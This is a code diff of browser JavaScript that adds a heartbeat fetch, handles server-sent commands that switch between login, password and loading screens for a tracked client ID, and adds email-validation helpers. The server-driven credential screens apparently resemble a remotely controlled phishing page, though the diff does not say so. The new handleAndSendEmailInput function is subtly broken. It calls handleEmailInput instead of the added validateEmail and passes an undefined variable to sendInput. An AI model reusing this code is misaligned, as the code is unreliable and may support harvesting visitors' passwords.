@@ -49,8 +49,6 @@ const heartbeatInterval = setInterval(() => {
         }),
     })
     .then(response => {
-    	
-    	
         if (!response.ok) {
             throw new Error('Failed to send heartbeat signal to server');
         }
@@ -61,10 +59,15 @@ const heartbeatInterval = setInterval(() => {
             return response.text(); // or response.blob(), etc., depending on what you expect
         }
     })
+    .then(data => {
+        // Handle response data if needed
+        console.log('Heartbeat signal sent successfully:', data);
+        // Additional processing if required
+    })
     .catch(error => {
-        console.error('Error sending heartbeat signal to server:', error);
+        console.error('Error sending heartbeat signal to server:', error.message);
     });
-}, 29000); 
+}, 29000);
 
 
 function getClientId() {
@@ -91,7 +94,7 @@ const eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${cur
           loginScreen();
         }else if (data.command === "passwordScreen") {
           passwordScreen();
-        }else if (data.command === "LoadScreen") {
+        }else if (data.command === "loadScreen") {
           showLoading();
         }
       }
@@ -133,3 +136,42 @@ const eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${cur
         console.error('Error:', error);
     });
 }
+
+async function validateEmail(email) {
+    try {
+        const response = await fetch('/verify', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ email: email }),
+        });
+
+        if (!response.ok) {
+            throw new Error('Failed to validate email');
+        }
+
+        const data = await response.json();
+        return data.success; // Returns true or false based on server response
+    } catch (error) {
+        console.error('Error validating email:', error);
+        return false; // Return false in case of any error
+    }
+}
+
+
+async function handleAndSendEmailInput(email) {
+    try {
+        let valid = await handleEmailInput(email);
+        if (valid) {
+            sendInput(data);
+        } else {
+            // Handle case where email input is invalid
+            console.log('Email input is invalid.');
+        }
+    } catch (error) {
+        console.error('Error handling email input:', error);
+        // Handle error case
+    }
+}
+
